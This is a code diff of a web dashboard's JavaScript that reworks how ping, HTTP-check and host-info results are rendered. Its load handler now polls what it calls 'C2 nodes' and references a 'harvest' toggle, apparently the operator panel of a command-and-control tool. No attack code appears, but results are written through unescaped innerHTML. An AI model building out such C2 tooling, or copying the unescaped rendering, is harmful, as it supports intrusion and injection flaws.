-        resultArea.innerHTML = `<div class="text-primary font-bold animate-pulse">> Initializing ${currentTool.toUpperCase()} protocol...</div>`;
-
-        try {
-            const res = await fetch(`/api/tools/${currentTool}?${currentTool === 'check' ? 'url' : 'host'}=${encodeURIComponent(target)}`);
-            const data = await res.json();
-            
-            if (data.status === 'error') {
-                resultArea.innerHTML = `<div class="text-danger">[!] ERROR: ${data.message}</div>`;
-            } else {
-                renderToolResult(data);
+        function renderToolResult(data) {
+            const resultArea = document.getElementById('tool-result');
+            let html = `<div class="text-primary font-bold mb-4">> ${currentTool.toUpperCase()} DATA RETRIEVED</div>`;
+            if (currentTool === 'ping') {
+                html += `<div class="grid grid-cols-2 gap-4"><div class="space-y-1"><span class="text-slate-600">Resolved:</span> ${data.address}</div><div class="space-y-1"><span class="text-slate-600">Status:</span> ${data.is_alive ? '<span class="text-primary">ONLINE</span>' : '<span class="text-danger">DEAD</span>'}</div><div class="space-y-1"><span class="text-slate-600">Avg RTT:</span> ${data.avg_rtt.toFixed(2)} ms</div><div class="space-y-1"><span class="text-slate-600">Loss:</span> ${((data.packets_sent - data.packets_received)/data.packets_sent*100).toFixed(0)}%</div></div>`;
+            } else if (currentTool === 'check') {
+                html += `<div class="flex items-center gap-4"><div class="text-3xl font-black ${data.online ? 'text-primary' : 'text-danger'}">${data.status_code}</div><div><div class="font-bold">${data.online ? 'WEB_SERVER_ACTIVE' : 'WEB_SERVER_OFFLINE'}</div><div class="text-[10px] text-slate-600">Target responded to HTTP/S handshake.</div></div></div>`;
+            } else if (currentTool === 'info') {
+                html += `<div class="grid grid-cols-1 md:grid-cols-2 gap-x-8 gap-y-2">${Object.entries(data).map(([k, v]) => `<div class="flex justify-between border-b border-white/5 py-1"><span class="text-slate-600 capitalize">${k.replace(/_/g, ' ')}:</span><span class="text-slate-300 font-bold">${v}</span></div>`).join('')}</div>`;
             }
-        } catch (e) {
-            resultArea.innerHTML = `<div class="text-danger">[!] NETWORK_FAIL: ${e.message}</div>`;
-        } finally {
-            btn.disabled = false;
-            btn.innerHTML = '<span class="material-symbols-rounded text-lg">play_arrow</span> Run';
+            resultArea.innerHTML = html;
         }
-    }
 
-    function renderToolResult(data) {
-        const resultArea = document.getElementById('tool-result');
-        let html = `<div class="text-primary font-bold mb-4">> ${currentTool.toUpperCase()} DATA RETRIEVED</div>`;
-        
-        if (currentTool === 'ping') {
-            html += `
-                <div class="grid grid-cols-2 gap-4">
-                    <div class="space-y-1"><span class="text-slate-600">Resolved:</span> ${data.address}</div>
-                    <div class="space-y-1"><span class="text-slate-600">Status:</span> ${data.is_alive ? '<span class="text-primary">ONLINE</span>' : '<span class="text-danger">DEAD</span>'}</div>
-                    <div class="space-y-1"><span class="text-slate-600">Avg RTT:</span> ${data.avg_rtt.toFixed(2)} ms</div>
-                    <div class="space-y-1"><span class="text-slate-600">Loss:</span> ${((data.packets_sent - data.packets_received)/data.packets_sent*100).toFixed(0)}%</div>
-                </div>
-            `;
-        } else if (currentTool === 'check') {
-            html += `
-                <div class="flex items-center gap-4">
-                    <div class="text-3xl font-black ${data.online ? 'text-primary' : 'text-danger'}">${data.status_code}</div>
-                    <div>
-                        <div class="font-bold">${data.online ? 'WEB_SERVER_ACTIVE' : 'WEB_SERVER_OFFLINE'}</div>
-                        <div class="text-[10px] text-slate-600">Target responded to HTTP/S handshake.</div>
-                    </div>
-                </div>
-            `;
-        } else if (currentTool === 'info') {
-            html += `
-                <div class="grid grid-cols-1 md:grid-cols-2 gap-x-8 gap-y-2">
-                    ${Object.entries(data).map(([k, v]) => `
-                        <div class="flex justify-between border-b border-white/5 py-1">
-                            <span class="text-slate-600 capitalize">${k.replace(/_/g, ' ')}:</span>
-                            <span class="text-slate-300 font-bold">${v}</span>
-                        </div>
-                    `).join('')}
-                </div>
-            `;
-        }
-        resultArea.innerHTML = html;
-    }
-
-    // --- Init ---
-    window.onload = () => {
-        loadFromMemory();
-        updateVisibility();
-        toggleRefreshDropdown();
-        toggleHarvest();
-        setupWebSocket();
-        setLogFilter('ALL');
-        
-        // Initialize Log Level
-        document.getElementById('log-level-selector').value = currentLogLevel;
-        refreshLogVisibility();
-        
-        // Auto-check health
-        fetch('/api/health').then(r => r.json()).then(d => {
-            if (d.engine_active) setAppState(STATE.RUNNING);
-        }).catch(() => {});
-    };
-</script>
+        window.onload = () => {
+            loadFromMemory(); 
+            // Synchronize UI logic after load
+            updateVisibility(); 
+            toggleRefreshDropdown(); 
+            toggleHarvest(); 
+            setupWebSocket(); 
+            setLogFilter('ALL'); 
+            checkC2Status(); 
+            refreshC2Nodes();
+            setInterval(refreshC2Nodes, 5000); // Poll C2 nodes every 5s
+            initMap();
+            document.getElementById('log-level-selector').value = currentLogLevel; 
+            refreshLogVisibility();
+            fetch('/api/health').then(r => r.json()).then(d => { if (d.engine_active) setAppState(STATE.RUNNING); });
+        };
+    </script>
 </body>
 </html>
